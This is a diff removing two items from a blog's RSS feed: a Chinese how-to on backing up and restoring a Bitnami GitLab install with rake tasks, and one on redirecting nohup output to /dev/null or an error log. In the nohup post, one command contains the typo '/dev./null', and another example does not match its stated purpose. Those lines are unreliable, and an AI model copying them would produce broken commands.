-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#gitlab私有仓库的备份和还原&quot; id=&quot;markdown-toc-gitlab私有仓库的备份和还原&quot;&gt;Gitlab私有仓库的备份和还原&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-gitlab的搭建&quot; id=&quot;markdown-toc-1-gitlab的搭建&quot;&gt;1. Gitlab的搭建&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2-配置备份路径&quot; id=&quot;markdown-toc-2-配置备份路径&quot;&gt;2. 配置备份路径&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3-备份gitlab&quot; id=&quot;markdown-toc-3-备份gitlab&quot;&gt;3. 备份Gitlab&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#4-还原gitlab&quot; id=&quot;markdown-toc-4-还原gitlab&quot;&gt;4. 还原Gitlab&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;gitlab私有仓库的备份和还原&quot;&gt;Gitlab私有仓库的备份和还原&lt;/h1&gt;
-
-&lt;h2 id=&quot;1-gitlab的搭建&quot;&gt;1. Gitlab的搭建&lt;/h2&gt;
-
-&lt;p&gt;单纯的搭建Gitlab需要安装和配置很多东西，过于麻烦，这里使用&lt;strong&gt;&lt;a href=&quot;https://bitnami.com&quot;&gt;bitnami&lt;/a&gt;&lt;/strong&gt;的一键安装方式进行安装，傻瓜式的安装按步骤执行即可。Bitnami的Gitlab下载地址为 &lt;strong&gt;&lt;a href=&quot;https://bitnami.com/stack/gitlab&quot;&gt;https://bitnami.com/stack/gitlab&lt;/a&gt;&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;默认的Gitlab安装路径为&lt;/strong&gt;：/opt/gitlab-x.xx.x-x&lt;/p&gt;
-
-&lt;h2 id=&quot;2-配置备份路径&quot;&gt;2. 配置备份路径&lt;/h2&gt;
-
-&lt;p&gt;编辑 &lt;strong&gt;/opt/gitlab-8.12.6-0/apps/gitlab/htdocs/config/gitlab.yml&lt;/strong&gt; 文件，找到如下&lt;strong&gt;Backup&lt;/strong&gt;节点。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;## Backup settings
-backup:
-	# path: &quot;tmp/backups&quot; 默认的备份路径
-	path: &quot;/home/git/backup&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;配置好后需要重新启动Gitlab使其生效&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./ctlscript.sh restart
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;3-备份gitlab&quot;&gt;3. 备份Gitlab&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 切换到git用户&lt;/span&gt;
-su - git
-&lt;span class=&quot;c&quot;&gt;# 进入备份脚本目录&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt/gitlab-8.12.6-0/apps/gitlab/htdocs
-&lt;span class=&quot;c&quot;&gt;# 执行备份命令&lt;/span&gt;
-bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;bin/rake gitlab:backup:create &lt;span class=&quot;nv&quot;&gt;RAILS_ENV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;production
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;4-还原gitlab&quot;&gt;4. 还原Gitlab&lt;/h2&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 切换到git用户&lt;/span&gt;
-su - git
-&lt;span class=&quot;c&quot;&gt;# 进入备份脚本目录&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt/gitlab-8.12.6-0/apps/gitlab/htdocs
-&lt;span class=&quot;c&quot;&gt;# 执行还原命令&lt;/span&gt;
-bundle &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;bin/rake gitlab:backup:restore &lt;span class=&quot;nv&quot;&gt;RAILS_ENV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;production &lt;span class=&quot;nv&quot;&gt;BACKUP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1405247282
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;更多的备份还原参数请参看 &lt;a href=&quot;https://docs.gitlab.com/ce/raketasks/backup_restore.html&quot;&gt;https://docs.gitlab.com/ce/raketasks/backup_restore.html&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-</description>  
-               <pubDate>Sun, 23 Apr 2017 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2017/04/gitlab-backup-restore/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2017/04/gitlab-backup-restore/</guid>  
-               </item>  
-          
-            <item>  
-               <title>Nohup后台启动不输出及文件过大的问题</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#nohup后台启动不输出及文件过大的问题&quot; id=&quot;markdown-toc-nohup后台启动不输出及文件过大的问题&quot;&gt;Nohup后台启动不输出及文件过大的问题&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-背景&quot; id=&quot;markdown-toc-1-背景&quot;&gt;1. 背景&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-重定向概念&quot; id=&quot;markdown-toc-1-重定向概念&quot;&gt;1. 重定向概念&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2-无底洞devnull文件&quot; id=&quot;markdown-toc-2-无底洞devnull文件&quot;&gt;2. 无底洞/dev/null文件&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3-nohup的正常用法&quot; id=&quot;markdown-toc-3-nohup的正常用法&quot;&gt;3. nohup的正常用法&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;nohup后台启动不输出及文件过大的问题&quot;&gt;Nohup后台启动不输出及文件过大的问题&lt;/h1&gt;
-
-&lt;h2 id=&quot;1-背景&quot;&gt;1. 背景&lt;/h2&gt;
-
-&lt;p&gt;在Linux中常常使用&lt;strong&gt;nohup&lt;/strong&gt;的方式启动程序，目的是当关闭终端时程序能自由的后台执行，&lt;strong&gt;nohup&lt;/strong&gt;启动会将程序输出信息进行保持到&lt;strong&gt;nohup.out&lt;/strong&gt;文件中，久而久之此文件会过于庞大，且程序有自己的日志系统，所以&lt;strong&gt;nohup&lt;/strong&gt;的纪录往往是多余且没有效率的。&lt;/p&gt;
-
-&lt;h2 id=&quot;1-重定向概念&quot;&gt;1. 重定向概念&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;0 标准输入（默认）&lt;/li&gt;
-  &lt;li&gt;1 标准输出&lt;/li&gt;
-  &lt;li&gt;2 错误输出&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;将错误信息输出到error.log文件中&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nohup ./start.sh 2&amp;gt;error.log
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;将错误信息重定向到标准输出上&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nohup ./start.sh 2&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;2-无底洞devnull文件&quot;&gt;2. 无底洞/dev/null文件&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;/dev/null&lt;/strong&gt;可以比喻为Linux系统的垃圾桶，任何重定向到此的信息都会被丢掉。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;标准信息和错误信息都不纪录&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nohup ./start.sh 1&amp;gt;/dev./null 2&amp;gt;/dev/null
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;将错误重定向到标准输出再重定向到/dev/null&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nohup ./start.sh 2&amp;gt;&amp;amp;1
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;3-nohup的正常用法&quot;&gt;3. nohup的正常用法&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;标准信息丢弃，错误信息纪录到error.log文件&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nohup ./start.sh &amp;gt;/dev/null 2&amp;gt;error.log &amp;amp;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;标准信息和错误信息都丢弃&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nohup ./start.sh &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-</description>  
-               <pubDate>Tue, 18 Apr 2017 00:00:00 +0800</pubDate>  
-               <link>http://localhost:4000/2017/04/nohup-big-output/</link>  
-               <guid isPermaLink="true">http://localhost:4000/2017/04/nohup-big-output/</guid>  
                </item>  
           
     </channel>  
